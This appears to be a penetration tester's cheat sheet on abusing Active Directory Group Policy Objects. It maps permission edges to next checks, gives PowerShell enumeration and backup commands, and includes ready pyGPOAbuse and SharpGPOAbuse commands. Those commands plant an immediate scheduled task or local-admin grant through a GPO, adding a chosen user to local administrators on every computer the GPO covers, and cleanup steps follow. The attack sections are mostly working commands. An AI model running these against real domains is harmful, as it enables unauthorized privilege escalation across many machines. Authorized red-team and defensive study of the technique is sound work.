# Reading GPO edges

`GPLink` = GPO applies there. Needs edit rights on the GPO object and its SYSVOL folder + effective scope.

| Edge | Check next |
| --- | --- |
| `GenericWrite` / `GenericAll` on a GPO | Can you edit both the AD object and its SYSVOL directory? |
| `WriteDACL` / `WriteOwner` on a GPO | Can you grant yourself the edit right? |
| `GPLink` to an OU/domain | Target computer in scope after link state, inheritance, filtering? |
| `WriteGPLink` on an OU/domain | Is there also a GPO you control and can link? |

- Note GUID, `gPCFileSysPath`, version, extensions, link order. Confirm user vs computer policy target.

```powershell
Import-Module GroupPolicy
Get-GPO -Guid '<GPO-GUID>' -Domain '<DOMAIN.TLD>' -Server '<DC-FQDN>' |
    Format-List DisplayName,Id,GpoStatus,Owner,ComputerVersion,UserVersion,WmiFilter
Get-GPOReport -Guid '<GPO-GUID>' -ReportType Xml -Path '.\gpo-before.xml' -Domain '<DOMAIN.TLD>' -Server '<DC-FQDN>'
Backup-GPO -Guid '<GPO-GUID>' -Path '.\gpo-backup' -Domain '<DOMAIN.TLD>' -Server '<DC-FQDN>'
Get-GPInheritance -Target '<OU-OR-DOMAIN-DN>' -Domain '<DOMAIN.TLD>' -Server '<DC-FQDN>' |
    Format-List GpoInheritanceBlocked,GpoLinks,InheritedGpoLinks
```
- `Backup-GPO` needs the output folder to exist (`New-Item -ItemType Directory .\gpo-backup`).

## Abuse: immediate scheduled task (from Kali)
`pyGPOAbuse` edits the GPO's `ScheduledTasks.xml` over LDAP/SMB. No Windows foothold needed.
```bash
python3 pygpoabuse.py '<DOMAIN.TLD>/<USER>:<PW>' -gpo-id '<GPO-GUID>' -powershell -command 'net localgroup administrators <LOCAL-USER> /add' -dc-ip <DC-IP>
```
Trigger on the target (or wait for the policy refresh interval):
```cmd
gpupdate /force
```
Cleanup (deletes the Immediate-Task XML **and rolls back the GPO version**):
```bash
python3 pygpoabuse.py '<DOMAIN.TLD>/<USER>:<PW>' -gpo-id '<GPO-GUID>' --cleanup -dc-ip <DC-IP>
```
- `-user`: run as the logged-on user instead of SYSTEM (computer policy context is the default).
- Kerberos ticket instead of password: `-k -no-pass -ccache <CCACHE-FILE>`.

## Abuse: immediate task or local admin (from Windows)
```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName <TASK> --Author <DOMAIN>\<USER> --Command cmd.exe --Arguments "/c net localgroup administrators <LOCAL-USER> /add" --GPOName '<GPO-DISPLAY-NAME>'
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <LOCAL-USER> --GPOName '<GPO-DISPLAY-NAME>'
gpupdate /force
```
- `--GPOName` wants the GPO's display name, not its GUID (compare to `pyGPOAbuse`'s `-gpo-id`).
- No built-in cleanup: SharpGPOAbuse bumps the GPO's AD `versionNumber` and the SYSVOL `GPT.INI` version (clients need that to re-pull it) but has no remove/rollback action. Strip the added entry from `ScheduledTasks.xml` / `GptTmpl.inf` in SYSVOL by hand afterwards, or the task/admin grant and the version bump stay.
